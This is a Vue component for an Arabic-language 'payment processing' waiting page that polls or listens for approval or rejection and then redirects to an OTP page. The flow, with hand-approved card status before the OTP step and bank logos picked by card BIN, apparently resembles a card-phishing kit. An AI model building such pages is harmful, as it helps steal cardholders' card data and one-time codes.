<template>
    <div class="min-h-screen bg-slate-50 flex flex-col" dir="rtl">
        <div class="flex-1 flex flex-col items-center justify-center py-6 sm:py-10 px-4 relative overflow-hidden">
        <!-- Subtle Saudi map background -->
        <img :src="bannerBg" alt="" aria-hidden="true"
            class="pointer-events-none absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] sm:w-[750px] select-none"
            style="opacity: 0.5" />

        <div class="relative bg-white rounded-2xl shadow-sm border border-slate-200 overflow-hidden w-full"
            style="max-width: 440px">

            <!-- Bank Logo -->
            <div v-if="bankLogo"
                class="absolute top-4 left-4 z-10 bg-white/90 backdrop-blur-sm rounded-lg px-2.5 py-1 border border-slate-200 shadow-sm">
                <img :src="bankLogo" alt="Bank logo" class="h-5 sm:h-6 object-contain" />
            </div>

            <!-- Main Content -->
            <div class="px-5 sm:px-8 pt-10 sm:pt-12 pb-6 sm:pb-8 text-center">

                <!-- Spinner -->
                <div class="mb-5">
                    <div class="relative inline-flex items-center justify-center w-28 h-28">
                        <img src="/images/logo/Wc8C.gif" alt="جارٍ التحميل" class="w-28 h-28" width="112" height="112" />
                    </div>
                </div>

                <!-- Title -->
                <h1 class="text-xl sm:text-2xl font-bold text-foreground mb-2">جارٍ معالجة عملية الدفع</h1>
                <p class="text-sm sm:text-base text-slate-600">يتم الآن تأكيد العملية، يرجى الانتظار وعدم إغلاق الصفحة</p>

                <!-- Bank Verification Notice -->
                <div v-if="paymentStatus !== 'approved' && paymentStatus !== 'rejected'" class="mt-6 bg-sky-50 border border-sky-200 rounded-xl p-4">
                    <div class="flex items-start gap-3">
                        <div class="w-9 h-9 rounded-full bg-sky-100 flex items-center justify-center shrink-0">
                            <svg class="w-4.5 h-4.5 text-sky-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
                            </svg>
                        </div>
                        <div class="text-right flex-1">
                            <p class="text-sm font-semibold text-sky-800 mb-1">توثيق العملية</p>
                            <p class="text-xs sm:text-sm text-sky-700 leading-relaxed">
                                قد يتطلب البنك التحقق من العملية عبر وسيلة التوثيق المعتادة لديك. يُرجى متابعة تعليمات البنك لإكمال الدفع.
                            </p>
                        </div>
                    </div>
                </div>

                <!-- Taking too long notice -->
                <div v-if="waitingTooLong && paymentStatus !== 'approved' && paymentStatus !== 'rejected'" class="mt-4 bg-amber-50 border border-amber-200 rounded-xl p-4">
                    <div class="flex items-start gap-3">
                        <svg class="w-5 h-5 text-amber-500 shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                        </svg>
                        <div class="text-right flex-1">
                            <p class="text-sm font-semibold text-amber-800">العملية تستغرق وقتاً أطول من المعتاد</p>
                            <p class="text-xs text-amber-700 mt-1">إذا لم يتم الرد خلال دقيقة، يمكنك العودة والمحاولة مرة أخرى</p>
                            <button
                                class="mt-2 text-xs text-amber-800 font-bold underline cursor-pointer hover:text-amber-900"
                                @click="goBackToCheckout">
                                العودة لصفحة الدفع
                            </button>
                        </div>
                    </div>
                </div>

                <!-- Status: Approved -->
                <div v-if="paymentStatus === 'approved'" class="mt-6">
                    <div
                        class="inline-flex items-center gap-2 bg-green-50 text-green-700 border border-green-200 rounded-full px-4 py-2 text-sm font-medium">
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>تمت الموافقة</span>
                    </div>
                    <p class="text-sm text-muted mt-2">جاري التحويل...</p>
                </div>

                <!-- Status: Rejected -->
                <div v-else-if="paymentStatus === 'rejected'" class="mt-6">
                    <div
                        class="inline-flex items-center gap-2 bg-red-50 text-destructive border border-red-200 rounded-full px-4 py-2 text-sm font-medium">
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd"
                                d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                                clip-rule="evenodd" />
                        </svg>
                        <span>تم الرفض</span>
                    </div>
                    <p class="text-sm text-slate-700 font-medium mt-3">
                        {{ friendlyRejectionReason || 'لم تتم الموافقة على العملية' }}
                    </p>
                    <p class="text-xs text-slate-500 mt-1">يمكنك المحاولة مرة أخرى ببطاقة مختلفة</p>
                    <p class="text-xs text-slate-400 mt-2">سيتم إعادة التوجيه تلقائياً...</p>
                    <button
                        class="mt-3 inline-flex items-center gap-2 bg-primary hover:bg-primary-dark text-white font-bold text-sm px-6 py-2.5 rounded-xl transition-colors cursor-pointer"
                        @click="goBackToCheckout">
                        <svg class="w-4 h-4 rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
                        </svg>
                        تعديل بيانات الدفع
                    </button>
                </div>

                <!-- Card Summary -->
                <div v-if="cardLast4" class="mt-6 space-y-1 text-sm">
                    <p class="text-slate-500">البطاقة المنتهية بـ <span class="font-bold text-foreground ltr-nums" dir="ltr">{{ cardLast4 }}</span></p>
                    <p class="text-slate-500">المبلغ: <span class="font-bold text-primary ltr-nums">{{ formattedAmount }}</span> <SarIcon className="size-2.5 fill-primary inline-block" /></p>
                </div>
            </div>

            <!-- Footer -->
            <div class="border-t border-slate-100 px-5 py-3 flex items-center justify-center gap-2 text-slate-400">
                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                </svg>
                <span class="text-xs">معاملة آمنة ومشفرة</span>
            </div>
        </div>

        <!-- Help -->
        <div class="mt-5 text-center">
            <p class="text-xs text-muted">
                للمساعدة أو الاستفسار:
                <a href="tel:920000000" class="text-secondary font-bold hover:underline mr-1">920000000</a>
            </p>
        </div>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackPaymentWaitStarted, trackPaymentWaitCompleted, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getCardStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import SarIcon from '@/components/SarIcon.vue';
import { getReasonLabel } from '@/constants/rejectionReasons';
import { BANK_LOGOS } from '@/constants/bankLogos';
import { detectBankFromBin } from '@/utils/bankDetector';
import bannerBg from '../../../images/logo/summary_logo/تنزيل.png';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'payment/waiting' );

// ─── Load context ───────────────────────────────────────────────────
const { context, resolveCustomerIp } = usePayment();
const _sessionId = computed( () => context.sessionId || '' );
const customerIp = ref( context.customerIp || '' );
const cardLast4 = computed( () => context.cardLast4 || '****' );
const _cardHolder = computed( () => context.cardHolder || '' );
const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );

const bankLogo = computed( () =>
{
    // Prefer backend-resolved bank code; fall back to client-side BIN detection
    const key = context.bankCode || detectBankFromBin( context.cardBin || '' );
    return key && BANK_LOGOS[key] ? BANK_LOGOS[key] : null;
} );

const formattedAmount = computed( () =>
{
    return totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } );
} );

// ─── WebSocket + Polling via composable ─────────────────────────────
const { status: paymentStatus, rejectionReason, setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'payment',
    approvedEvent: 'PaymentApproved',
    rejectedEvent: 'PaymentRejected',
    logTag: 'PaymentWaiting',

    onApproved ( event )
    {
        logger.debug( '[PaymentWaiting] Payment approved:', event );
        trackPaymentWaitCompleted();
        trackStepCompleted( 'payment_waiting', 'otp' );
        // Navigate to OTP page after brief visual feedback
        setTimeout( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'otp', router );
            } else
            {
                router.push( { name: 'otp' } );
            }
        }, 2000 );
    },

    onRejected ( event )
    {
        logger.debug( '[PaymentWaiting] Payment rejected:', event );
        // Clear otpContext so the beforeEnter guard blocks re-entry
        sessionStorage.removeItem( 'otpContext' );
        // Auto-redirect to checkout after brief visual feedback
        setTimeout( () =>
        {
            router.replace( { name: 'checkout', query: { rejectionReason: event.reason || '' } } );
        }, 3000 );
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sessionId = context.sessionId || '';
        const sig = context.statusSigs?.card || '';
        if ( !sessionId || !sig )
        {
            logger.warn( '[PaymentWaiting] Poll skipped — missing sessionId or sig', { sessionId: !!sessionId, sig: !!sig } );
            return;
        }

        const { data } = await getCardStatus( sessionId, sig );

        if ( data.status === 'approved' )
        {
            handleApproved( data );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.rejection_reason || '' } );
        }
    },
} );

const friendlyRejectionReason = computed( () => getReasonLabel( rejectionReason.value, t ) );

function goBackToCheckout ()
{
    sessionStorage.removeItem( 'otpContext' );
    router.replace( { name: 'checkout', query: { rejectionReason: rejectionReason.value || '' } } );
}

// "Taking too long" indicator — shown after 30 seconds of waiting
const waitingTooLong = ref( false );
let waitingTimer = null;

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIp.value || await resolveCustomerIp();
    customerIp.value = ip;
    setupWs( ip );
    trackStepViewed( 'payment_waiting' );
    trackPaymentWaitStarted();

    // Show "taking too long" notice after 30 seconds
    waitingTimer = setTimeout( () => { waitingTooLong.value = true; }, 30000 );
} );

onUnmounted( () =>
{
    if ( waitingTimer ) clearTimeout( waitingTimer );
} );
</script>
